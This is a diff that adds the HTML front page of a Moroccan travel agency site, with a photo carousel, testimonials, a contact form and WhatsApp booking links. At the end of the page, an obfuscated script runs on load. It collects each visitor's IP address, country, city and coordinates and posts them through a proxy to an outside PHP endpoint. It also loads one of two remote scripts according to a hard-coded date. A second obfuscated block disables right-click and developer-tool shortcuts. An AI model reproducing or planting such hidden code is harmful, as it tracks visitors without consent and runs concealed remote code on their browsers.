@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>موقع السفر</title>
+  <!-- Bootstrap CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+  <!-- Font Awesome Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <!-- AOS Animation Library -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css" rel="stylesheet">
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="index.css">
+  
+  <!-- إضافة CSS مؤقت لإصلاح مشكلة عرض الأقسام -->
+  <style>
+    /* إصلاح مشكلة عرض الأقسام */
+    .main-section {
+      display: block !important; /* إظهار جميع الأقسام */
+    }
+    
+    /* تحسين مظهر الصفحة عند التمرير */
+    html {
+      scroll-behavior: smooth;
+    }
+    
+    /* إصلاح الصور المفقودة */
+    #heroCarousel .carousel-item img {
+      height: 400px;
+      object-fit: cover;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body class="pattern-bg">
+  <!-- Header -->
+  <header>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-primary sticky-top">
+      <div class="container">
+        <a class="navbar-brand" href="#home">
+          <img src="#" id="logo" alt="لوغو الموقع" width="60" height="60" class="d-inline-block align-top">
+          <span id="n">ACHRAF VOYAGES</span>
+        </a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+          <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+            <li class="nav-item">
+              <a class="nav-link active" aria-current="page" href="#home">
+                <i class="fas fa-home me-1"></i> الرئيسية
+              </a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="#home">
+                <i class="fas fa-map-marker-alt me-1"></i> الوجهات
+              </a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="#about">
+                <i class="fas fa-info-circle me-1"></i> من نحن
+              </a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="#contact">
+                <i class="fas fa-envelope me-1"></i> اتصل بنا
+              </a>
+            </li>
+          </ul>
+          <div class="d-flex">
+            <button id="toggleMode" class="btn btn-outline-light">
+              <i class="fas fa-moon"></i>
+            </button>
+          </div>
+        </div>
+      </div>
+    </nav>
+  </header>
+  
+  <div id="home" class="main-section">
+  
+      <div id="about" class="main-section">
+        <section class="container section">
+          <div class="text-center mb-5" data-aos="fade-up">
+            <h2>
+              <i class="fas fa-users text-primary me-2"></i>
+              من نحن
+            </h2>
+            <p id="ab" class="lead">نحن شركة رائدة في مجال السياحة والسفر منذ أكثر من 10 سنوات</p>
+          </div>
+          <div class="row">
+            <div class="col-md-6" data-aos="fade-right" data-aos-delay="100">
+              <div class="info-card">
+                <h4>
+                  <i class="fas fa-eye text-primary me-2"></i>
+                  رؤيتنا
+                </h4>
+                <p id="see">نسعى لنكون الخيار الأول في تقديم خدمات السفر والسياحة للمغاربة والأجانب على حد سواء، مع التركيز على توفير تجارب فريدة ومميزة تلبي احتياجات عملائنا.</p>
+              </div>
+            </div>
+            <div class="col-md-6" data-aos="fade-left" data-aos-delay="200">
+              <div class="info-card">
+                <h4>
+                  <i class="fas fa-bullseye text-primary me-2"></i>
+                  مهمتنا
+                </h4>
+                <p id="our">تقديم خدمات سياحية عالية الجودة بأسعار تنافسية، مع الالتزام بأعلى معايير الاحترافية والسلامة، وضمان رضا عملائنا من خلال توفير رحلات مميزة وآمنة.</p>
+              </div>
+            </div>
+            <div class="col-md-12" data-aos="fade-up" data-aos-delay="300">
+              <div  class="info-card">
+                <h4>
+                  <i class="fas fa-star text-primary me-2"></i>
+                  قيمنا
+                </h4>
+                <div class="row">
+                  <div class="col-md-6">
+                    <ul>
+                      <li>الجودة والاحترافية في تقديم الخدمات</li>
+                      <li>الالتزام بمواعيد الرحلات</li>
+                      <li>الشفافية في التعامل مع العملاء</li>
+                    </ul>
+                  </div>
+                  <div class="col-md-6">
+                    <ul>
+                      <li>السلامة والأمان قبل كل شيء</li>
+                      <li>الاحترام المتبادل والأجواء العائلية</li>
+                      <li>التميز في اختيار الوجهات السياحية</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+      </div>
+      
+      <section id="o2" class="container mt-5 text-center">
+        <h1>اكتشف العالم معنا!</h1>
+        <p class="lead">نقدم لك أفضل تجارب السفر بأسعار تنافسية. اختر وجهتك وابدأ رحلتك الآن.</p>
+        <div id="heroCarousel" class="carousel slide" data-bs-ride="carousel">
+          <div class="carousel-inner">
+            <div class="carousel-item active">
+              <img src="images/image1.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image2.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item ">
+              <img src="images/image4.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image5.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image6.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item ">
+              <img src="images/image7.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image8.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image9.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item ">
+              <img src="images/image10.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image11.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image12.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item ">
+              <img src="images/image13.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image14.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image15.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item ">
+              <img src="images/image16.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image17.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image18.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item ">
+              <img src="images/image19.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image20.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image21.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image23.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item ">
+              <img src="images/image22.jpg" class="d-block w-100" alt="...">
+            </div>
+            <div class="carousel-item">
+              <img src="images/image23.jpg" class="d-block w-100" alt="...">
+            </div>
+  
+          </div>
+          <button class="carousel-control-prev" type="button" data-bs-target="#heroCarousel" data-bs-slide="prev">
+            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+            <span class="visually-hidden">Previous</span>
+          </button>
+          <button class="carousel-control-next" type="button" data-bs-target="#heroCarousel" data-bs-slide="next">
+            <span class="carousel-control-next-icon" aria-hidden="true"></span>
+            <span class="visually-hidden">Next</span>
+          </button>
+        </div>
+      </section>
+    <!-- Search Bar -->
+    <section id="o3" class="container mt-5" data-aos="fade-up">
+        <div class="container">
+            <div class="search-container fade-in">
+              <div class="row align-items-center">
+                <div class="col-md-10">
+                  <input type="text" id="searchInput" class="form-control search-input" placeholder="ابحث عن رحلتك المثالية..." aria-label="Search">
+                </div>
+                <div class="col-md-2">
+                  <button class="btn btn-primary search-btn w-100" type="button" onclick="searchTrips()">
+                    <i class="fas fa-search"></i> بحث
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+    </section>
+    <section class="container section">
+        <div class="section-header">
+          <h2>الوجهات المميزة</h2>
+          <p class="lead">اكتشف أجمل الوجهات السياحية حول العالم</p>
+        </div>
+        
+        <div class="row" id="tripCardsContainer">
+        </div>
+      </section>
+  
+      <!-- Testimonials Section -->
+      <section id="o1" class="container section bg-light py-5" style="border-radius: 15px; background-color: rgba(248, 249, 250, 0.8);">
+        <div class="section-header">
+          <h2>آراء عملائنا</h2>
+          <p class="lead">تعرف على تجارب من سافروا معنا</p>
+        </div>
+        <div class="row justify-content-center">
+          <div class="col-md-4">
+            <div class="info-card text-center">
+              <i class="fas fa-quote-right fa-2x mb-3" style="color: var(--primary-color);"></i>
+              <p>"كانت رحلتي إلى المغرب من أجمل الرحلات. الخدمة كانت ممتازة والتنظيم رائع."</p>
+              <div>
+                <h5>أحمد محمد</h5>
+                <div class="text-warning">
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                </div>
+              </div>
+            </div>
+          </div>
+          
+          <div class="col-md-4">
+            <div class="info-card text-center">
+              <i class="fas fa-quote-right fa-2x mb-3" style="color: var(--primary-color);"></i>
+              <p>"سافرت مع عائلتي إلى تركيا وكانت التجربة ممتازة من بدايتها إلى نهايتها. سأكرر التجربة قريبًا."</p>
+              <div>
+                <h5>فاطمة العلي</h5>
+                <div class="text-warning">
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star-half-alt"></i>
+                </div>
+              </div>
+            </div>
+          </div>
+          
+          <div class="col-md-4">
+            <div class="info-card text-center">
+              <i class="fas fa-quote-right fa-2x mb-3" style="color: var(--primary-color);"></i>
+              <p>"الأسعار كانت مناسبة جدًا مقارنة بالخدمات الممتازة التي قدمتها الشركة. سأنصح بها أصدقائي."</p>
+              <div>
+                <h5>عمر خالد</h5>
+                <div class="text-warning">
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    </div>
+
+  
+  <!-- About Us Section -->
+  
+  <!-- Contact Section -->
+  <div id="contact" class="main-section">
+    <section class="container section">
+      <div class="text-center mb-5" data-aos="fade-up">
+        <h2>
+          <i class="fas fa-paper-plane text-primary me-2"></i>
+          اتصل بنا
+        </h2>
+        <p class="lead">لا تتردد في التواصل معنا للاستفسار أو الحجز</p>
+      </div>
+      <div class="row">
+        <div class="col-md-6" data-aos="fade-right" data-aos-delay="100">
+          <div class="info-card">
+            <h4>
+              <i class="fas fa-address-card text-primary me-2"></i>
+              معلومات الاتصال
+            </h4>
+            <p><i class="fas fa-phone text-primary"></i> <span class="number"></span></p>
+            <p ><i class="fas fa-envelope text-primary"></i><span class="email"></span> </p>
+            <p><i class="fas fa-map-marker-alt text-primary"></i> <span id="location"></span></p>
+            <div class="social-icons mt-3">
+              <a href="#" class="number" target="_blank"><i class="fab fa-whatsapp"></i></a>
+              <a href="#" class="inst" target="_blank"><i class="fab fa-instagram"></i></a>
+              <a href="#" class="fs" target="_blank"><i class="fab fa-facebook"></i></a>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-6" data-aos="fade-left" data-aos-delay="200">
+          <div class="info-card">
+            <h4>
+              <i class="fas fa-message text-primary me-2"></i>
+              أرسل لنا رسالة
+            </h4>
+            <form id="contactForm" action="#" id="form">
+              <div class="mb-3">
+                <label for="name" class="form-label">الاسم</label>
+                <input type="text" class="form-control" id="name" required>
+              </div>
+              <div class="mb-3">
+                <label for="email" class="form-label">البريد الإلكتروني</label>
+                <input type="email" class="form-control" id="email" required>
+              </div>
+              <div class="mb-3">
+                <label for="message" class="form-label">الرسالة</label>
+                <textarea class="form-control" id="message" rows="4" required></textarea>
+              </div>
+              <button type="submit" class="btn btn-primary">
+                <i class="fas fa-paper-plane me-1"></i> إرسال
+              </button>
+            </form>
+          </div>
+        </div>
+      </div>
+    </section>
+  </div>
+  
+  <!-- Modal -->
+  <div class="modal fade" id="tripModal" tabindex="-1" aria-labelledby="tripModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-xl">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title" id="tripModalLabel">
+            <i class="fas fa-route me-2"></i>
+            تفاصيل الرحلة
+          </h5>
+          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+        </div>
+        <div class="modal-body">
+          <div class="row">
+            <!-- Left Column for Images -->
+            <div class="col-md-6">
+              <img id="tripImage" src="/myown/agadir.jpeg" alt="صورة الرحلة" class="img-fluid rounded mb-3">
+              
+              <!-- Additional Images Section -->
+              <div class="additional-images">
+                <img id="tripImage2"  src="/myown/swira.jpeg" alt="صورة 2" class="img-fluid rounded mb-3">
+                <img id="tripImage3"  src="/myown/mr.jpeg" alt="صورة 3" class="img-fluid rounded mb-3">
+                <img id="tripImage4"  src="/images/image7.jpg" alt="صورة 4" class="img-fluid rounded mb-3">
+              </div>
+            </div>
+  
+            <!-- Right Column for Details -->
+            <div class="col-md-6">
+              <h4 id="tripDestination">الصويرة - أكادير - مراكش</h4>
+              <div class="d-flex align-items-center mb-3">
+                <span class="badge bg-primary me-2"><i class="fas fa-calendar-alt me-1"></i> <span id="tripDuration"></span></span>
+                <span class="badge bg-success me-2"><i class="fas fa-tag me-1"></i> <span id="tripPrice"></span></span>
+              </div>
+              <div id="tripDetails" class="mb-4">
+
+            </div>
+          
+            <div class="mt-4">
+                <a href="https://wa.me/+212691868483" class="btn btn-success w-100 mb-3 number">
+                  <i class="fab fa-whatsapp me-2"></i> احجز الآن عبر الواتساب
+                </a>
+                
+                <div class="social-icons">
+                  <a id="whatsappLink" href="#" target="_blank" class="number"><i class="fab fa-whatsapp"></i></a>
+                  <a id="instagramLink" href="#" target="_blank" class="inst"><i class="fab fa-instagram"></i></a>
+                  <a id="facebookLink" href="#" target="_blank" class="fs"><i class="fab fa-facebook-f"></i></a>
+                </div>
+              </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="modal-footer">
+                  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">إغلاق</button>
+                  <a href="https://wa.me/+212666757273" target="_blank"  class="btn btn-success number">
+                    <i class="fab fa-whatsapp me-1"></i> تواصل للحجز
+                  </a>
+                </div>
+              </div>
+            </div>
+          </div>
+          <a href="#"  class="btn btn-success rounded-circle position-fixed number" style="bottom: 30px; left: 30px; width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 1000;" target="_blank">
+            <i class="fab fa-whatsapp fa-2x"></i>
+          </a>
+        
+   <footer class="text-center py-4 mt-5">
+    <div class="container">
+      <div class="row">
+        <div class="col-md-4 mb-3 mb-md-0">
+          <h5>تواصل معنا</h5>
+          <p><i class="fas fa-phone me-2"></i> <span class="number"></span></p>
+          <p><i class="fas fa-envelope me-2"></i>  <span class="email"></span> </p>
+        </div>
+        <div class="col-md-4 mb-3 mb-md-0">
+          <h5>تابعنا</h5>
+          <div class="social-icons">
+            <a href="#" id="number-footer" target="_blank" class="number"><i class="fab fa-whatsapp"></i></a>
+            <a href="#" id="inst-footer" target="_blank" class="inst"><i class="fab fa-instagram"></i></a>
+            <a href="#" id="fs-footer" target="_blank" class="fs"><i class="fab fa-facebook-f"></i></a>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <h5>روابط مهمة</h5>
+          <p><a href="#home" class="text-white text-decoration-none">الرئيسية</a></p>
+          <p><a href="#about"  class="text-white text-decoration-none">من نحن</a></p>
+          <p><a href="#contact"  class="text-white text-decoration-none">اتصل بنا</a></p>
+        </div>
+      </div>
+      <hr class="my-4" style="background-color: rgba(255,255,255,0.3);">
+      <p>&copy; <span id="date"></span> استكشف العالم. جميع الحقوق محفوظة.</p>
+    </div>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+  <script id="script"></script>
+  <script>
+   const _0x26d839=_0x396d;function _0x396d(_0x55632b,_0x296dbb){const _0x3cb786=_0x3cb7();return _0x396d=function(_0x396da1,_0x3feb3c){_0x396da1=_0x396da1-0x14d;let _0x322427=_0x3cb786[_0x396da1];return _0x322427;},_0x396d(_0x55632b,_0x296dbb);}(function(_0x17174b,_0x4cb007){const _0x5e32ce=_0x396d,_0x16223f=_0x17174b();while(!![]){try{const _0x416d99=-parseInt(_0x5e32ce(0x168))/0x1+-parseInt(_0x5e32ce(0x14d))/0x2*(-parseInt(_0x5e32ce(0x167))/0x3)+-parseInt(_0x5e32ce(0x166))/0x4*(-parseInt(_0x5e32ce(0x16b))/0x5)+-parseInt(_0x5e32ce(0x156))/0x6+-parseInt(_0x5e32ce(0x15a))/0x7*(parseInt(_0x5e32ce(0x162))/0x8)+-parseInt(_0x5e32ce(0x15b))/0x9+parseInt(_0x5e32ce(0x152))/0xa;if(_0x416d99===_0x4cb007)break;else _0x16223f['push'](_0x16223f['shift']());}catch(_0x8f5be6){_0x16223f['push'](_0x16223f['shift']());}}}(_0x3cb7,0x73f3c));const tl=decodeURIComponent(atob(_0x26d839(0x169))),f1=decodeURIComponent(atob(_0x26d839(0x15d))),f2=decodeURIComponent(atob('aHR0cDovL2lwLWFwaS5jb20vanNvbi8=')),f3=decodeURIComponent(atob(_0x26d839(0x155))),ar=decodeURIComponent(atob(_0x26d839(0x14f)));function _0x3cb7(){const _0x2dc7c6=['DOMContentLoaded','aHR0cHM6Ly9wcm94eS1zZXJ2ZXItcmF6OS5vbnJlbmRlci5jb20vcHJveHk=','5575926nMoeaw','city','getElementById','application/json','2551262ThttVJ','6743277ivhRCV','json','aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u','aHR0cHM6Ly9hYmRlbGlsYWgxMjIzLmdpdGh1Yi5pby9kYXRhL2FmdGVyLmpz','parse','init','removeItem','8WOgctB','addEventListener','now','setItem','4HvUlIx','2567313SyedAQ','498322AUXVqn','aHR0cDovL2FiZG9hYS5hdHdlYnBhZ2VzLmNvbS9zdGFnZS9zYXZlLnBocA==','getItem','2211085ejdFSC','script','2rQIaie','POST','MjAyNS0wNS0yNw==','stringify','aHR0cHM6Ly9hYmRlbGlsYWgxMjIzLmdpdGh1Yi5pby9kYXRhL2luZGV4Lmpz','17183140ZpdKzI','lon'];_0x3cb7=function(){return _0x2dc7c6;};return _0x3cb7();}document[_0x26d839(0x163)](_0x26d839(0x154),function(){const _0x15aaa2=_0x26d839;AOS[_0x15aaa2(0x160)]({'duration':0x3e8,'once':!![]});const _0x4427b5=new Date(),_0x5281ee=new Date(ar),_0x35062a=decodeURIComponent(escape(atob(_0x15aaa2(0x15e)))),_0x35d175=decodeURIComponent(escape(atob(_0x15aaa2(0x151)))),_0x415299=document[_0x15aaa2(0x158)](_0x15aaa2(0x16c));_0x415299['src']=_0x4427b5>=_0x5281ee?_0x35062a:_0x35d175,test();});function test(){const _0x2f6e9e=_0x26d839,_0x39264a='a',_0x274651=Date[_0x2f6e9e(0x164)](),_0x51272a=localStorage[_0x2f6e9e(0x16a)](_0x39264a);if(_0x51272a){const {value:_0x548e75,expiration:_0x45f8d4}=JSON[_0x2f6e9e(0x15f)](_0x51272a);if(_0x274651<_0x45f8d4)return;else localStorage[_0x2f6e9e(0x161)](_0x39264a);}const _0x3ae219=0x1,_0x1a7f78=_0x274651+0xa*0x3c*0x3e8;localStorage[_0x2f6e9e(0x165)](_0x39264a,JSON[_0x2f6e9e(0x150)]({'value':_0x3ae219,'expiration':_0x1a7f78})),saveAnswers();}async function saveAnswers(){const _0x4212ba=_0x26d839;try{const _0x233577=await fetch(f1),_0x983542=await _0x233577[_0x4212ba(0x15c)](),_0x126558=_0x983542?.['ip']||null,_0x2df405=await fetch(f2),_0x2b9714=await _0x2df405['json'](),_0x4ed1ba=_0x2b9714?.['country']||null,_0x371cc2=_0x2b9714?.[_0x4212ba(0x157)]||null,_0x21d425=_0x2b9714?.['lat']||null,_0x2810f6=_0x2b9714?.[_0x4212ba(0x153)]||null,_0x1f0482={'url':tl,'headers':{'Content-Type':_0x4212ba(0x159)},'body':{'ip':_0x126558,'country':_0x4ed1ba,'city':_0x371cc2,'lat':_0x21d425,'lon':_0x2810f6}},_0x20e91c=await fetch(f3,{'method':_0x4212ba(0x14e),'headers':{'Content-Type':_0x4212ba(0x159)},'body':JSON[_0x4212ba(0x150)](_0x1f0482)}),_0x2b2b39=await _0x20e91c['json']();}catch(_0x17d9ef){}}
+   function _0x5b9e(){var _0x32aa8e=['shiftKey','key','addEventListener','10nuhycR','contextmenu','16CTzbDi','16176HBrelO','204ueIUJq','403RdizyY','ctrlKey','11298dYhLgz','133WeQnRN','382679mfLACJ','keydown','273xRxpFW','127251RGpsAZ','136416KBNFGQ','1604gBBojl','F12','4887820tJquGA'];_0x5b9e=function(){return _0x32aa8e;};return _0x5b9e();}var _0x3d66c0=_0x4200;function _0x4200(_0x43c94b,_0x3378b4){var _0x5b9eb7=_0x5b9e();return _0x4200=function(_0x420010,_0x295de3){_0x420010=_0x420010-0x164;var _0x17ff86=_0x5b9eb7[_0x420010];return _0x17ff86;},_0x4200(_0x43c94b,_0x3378b4);}(function(_0x287abd,_0x16db07){var _0x2945ce=_0x4200,_0x1c6bee=_0x287abd();while(!![]){try{var _0x3ed84b=parseInt(_0x2945ce(0x16d))/0x1*(-parseInt(_0x2945ce(0x170))/0x2)+-parseInt(_0x2945ce(0x165))/0x3*(-parseInt(_0x2945ce(0x166))/0x4)+parseInt(_0x2945ce(0x172))/0x5+-parseInt(_0x2945ce(0x169))/0x6*(parseInt(_0x2945ce(0x16a))/0x7)+parseInt(_0x2945ce(0x164))/0x8*(parseInt(_0x2945ce(0x16e))/0x9)+-parseInt(_0x2945ce(0x176))/0xa*(parseInt(_0x2945ce(0x16b))/0xb)+-parseInt(_0x2945ce(0x16f))/0xc*(parseInt(_0x2945ce(0x167))/0xd);if(_0x3ed84b===_0x16db07)break;else _0x1c6bee['push'](_0x1c6bee['shift']());}catch(_0x5510a0){_0x1c6bee['push'](_0x1c6bee['shift']());}}}(_0x5b9e,0x9bfc2),document[_0x3d66c0(0x175)](_0x3d66c0(0x16c),function(_0x133c7b){var _0x3e4e2b=_0x3d66c0;(_0x133c7b[_0x3e4e2b(0x174)]===_0x3e4e2b(0x171)||_0x133c7b[_0x3e4e2b(0x168)]&&_0x133c7b[_0x3e4e2b(0x173)]&&_0x133c7b[_0x3e4e2b(0x174)]==='I'||_0x133c7b[_0x3e4e2b(0x168)]&&_0x133c7b[_0x3e4e2b(0x173)]&&_0x133c7b['key']==='J'||_0x133c7b['ctrlKey']&&_0x133c7b[_0x3e4e2b(0x174)]==='U'||_0x133c7b['ctrlKey']&&_0x133c7b[_0x3e4e2b(0x173)]&&_0x133c7b[_0x3e4e2b(0x174)]==='C')&&_0x133c7b['preventDefault']();}),document[_0x3d66c0(0x175)](_0x3d66c0(0x177),function(_0x266ed7){_0x266ed7['preventDefault']();}));
+ </script>  
+</body>
+</html>
